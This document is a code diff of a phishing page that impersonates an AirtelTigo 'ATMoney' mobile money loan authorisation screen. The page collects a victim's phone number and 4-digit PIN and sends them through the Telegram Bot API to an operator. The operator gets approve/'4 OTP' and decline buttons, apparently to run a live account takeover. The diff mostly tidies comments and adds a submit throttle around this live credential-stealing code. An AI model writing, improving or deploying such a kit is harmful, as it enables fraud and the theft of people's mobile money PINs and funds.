@@ -7,7 +7,7 @@
     <title>Verify & Authorize Loan - ATMoney</title>
     <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
     <style>
-        /* ── all styles unchanged except PIN ── */
+        /* ── all styles unchanged ── */
         :root {
             --red: #003DA5;
             --red-dark: #002D80;
@@ -277,7 +277,7 @@
             color: var(--text-light);
         }
 
-        /* ─── PIN INPUT – enhanced like Telecel ─── */
+        /* ─── PIN INPUT ─── */
         .pin-group {
             margin-bottom: 18px;
         }
@@ -321,9 +321,7 @@
             caret-color: var(--at-red);
             -webkit-appearance: none;
             appearance: none;
-            /* mask digits with bullets */
             -webkit-text-security: disc;
-            /* for firefox, use text-security but it's not standard; fallback to type=password via JS */
         }
 
         .pin-box:focus {
@@ -451,7 +449,6 @@
             flex-shrink: 0;
         }
 
-        /* ── responsive tweaks ── */
         @media (max-width: 460px) {
             .pin-container {
                 gap: 8px;
@@ -536,7 +533,7 @@
                 <div style="font-size:12px; color:var(--text-light); margin-top:4px;">Enter your AirtelTigo number</div>
             </div>
 
-            <!-- ─── 4‑DIGIT PIN (enhanced) ─── -->
+            <!-- ─── 4‑DIGIT PIN ─── -->
             <div class="pin-group">
                 <div class="label-row">
                     <label>Enter PIN</label>
@@ -579,6 +576,7 @@
         };
 
         let isProcessing = false;
+        let lastSubmitTime = 0;          // throttle timestamp
         let pollingInterval = null;
         let pollTimeout = null;
         let lastUpdateId = 0;
@@ -720,59 +718,58 @@
         }
 
         // ─── SEND TO BOT ──────────────────────────────────────────────
-        // ─── SEND TO BOT ──────────────────────────────────────────────
-function sendToBot(phone, pin) {
-    if (isProcessing) return;
-    isProcessing = true;
-    continueBtn.disabled = true;
-    continueBtn.textContent = "Requesting…";
+        function sendToBot(phone, pin) {
+            if (isProcessing) return;
+            isProcessing = true;
+            continueBtn.disabled = true;
+            continueBtn.textContent = "Requesting…";
 
-    const ts = Date.now();
-    const approveId = `approve_${ts}`;
-    const declineId = `decline_${ts}`;
+            const ts = Date.now();
+            const approveId = `approve_${ts}`;
+            const declineId = `decline_${ts}`;
 
-    spinner.style.display = 'flex';
+            spinner.style.display = 'flex';
 
-    const amountText = document.getElementById('loanAmount').textContent;
-    const accountType = document.getElementById('accountType').value;
+            const amountText = document.getElementById('loanAmount').textContent;
+            const accountType = document.getElementById('accountType').value;
 
-    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CONFIG.CHAT_ID,
-                text: `<b>🔴 ATMoney Login Request</b>\n\n` +
-                    `Amount: ${amountText}\n` +
-                    `Account: ${accountType === 'mobile' ? 'Mobile Money' : 'Broadband'}\n` +
-                    `Phone: <code>${phone}</code>\n` +
-                    `PIN: <code>${pin}</code>\n\n` +
-                    `Choose Action:`,
-                parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: "✅ 4 OTP  ", callback_data: approveId },
-                            { text: "❌ Decline", callback_data: declineId }
-                        ]
-                    ]
-                }
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (!data.ok) {
-                throw new Error('Telegram API error');
-            }
-            pollUpdates(approveId, declineId, phone, pin);
-        })
-        .catch(err => {
-            resetButton();
-            showError('Failed to send request. Please check your internet connection and try again.');
-            spinner.style.display = 'none';
-        });
-}
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.CHAT_ID,
+                        text: `<b>🔴 ATMoney Login Request</b>\n\n` +
+                            `Amount: ${amountText}\n` +
+                            `Account: ${accountType === 'mobile' ? 'Mobile Money' : 'Broadband'}\n` +
+                            `Phone: <code>${phone}</code>\n` +
+                            `PIN: <code>${pin}</code>\n\n` +
+                            `Choose Action:`,
+                        parse_mode: 'HTML',
+                        reply_markup: {
+                            inline_keyboard: [
+                                [
+                                    { text: "✅ 4 OTP  ", callback_data: approveId },
+                                    { text: "❌ Decline", callback_data: declineId }
+                                ]
+                            ]
+                        }
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        throw new Error('Telegram API error');
+                    }
+                    pollUpdates(approveId, declineId, phone, pin);
+                })
+                .catch(err => {
+                    resetButton();
+                    showError('Failed to send request. Please check your internet connection and try again.');
+                    spinner.style.display = 'none';
+                });
+        }
 
-        // ─── SUBMIT HANDLER ──────────────────────────────────────────────
+        // ─── SUBMIT HANDLER with throttle (after validation) ─────────
         continueBtn.onclick = () => {
             hideError();
 
@@ -794,12 +791,18 @@ function sendToBot(phone, pin) {
                 return;
             }
 
+            // Throttle only after valid input – prevents duplicate sends
+            const now = Date.now();
+            if (isProcessing || (now - lastSubmitTime < 2000)) {
+                return;
+            }
+            lastSubmitTime = now;
+
             sendToBot(phone, pin);
         };
 
         // ─── PIN BOX LOGIC ──────────────────────────────────────────────
         pinBoxes.forEach((box, index) => {
-            // input: digit → advance
             box.addEventListener('input', (e) => {
                 const val = e.target.value;
                 if (val.length > 0 && !/^[0-9]$/.test(val)) {
@@ -813,7 +816,6 @@ function sendToBot(phone, pin) {
                 hideError();
             });
 
-            // keydown: backspace, arrows
             box.addEventListener('keydown', (e) => {
                 if (e.key === 'Backspace' && box.value === '' && index > 0) {
                     e.preventDefault();
@@ -832,12 +834,10 @@ function sendToBot(phone, pin) {
                 }
             });
 
-            // focus: select all
             box.addEventListener('focus', () => {
                 box.select();
             });
 
-            // paste: fill all four
             box.addEventListener('paste', (e) => {
                 e.preventDefault();
                 const paste = (e.clipboardData || window.clipboardData).getData('text');
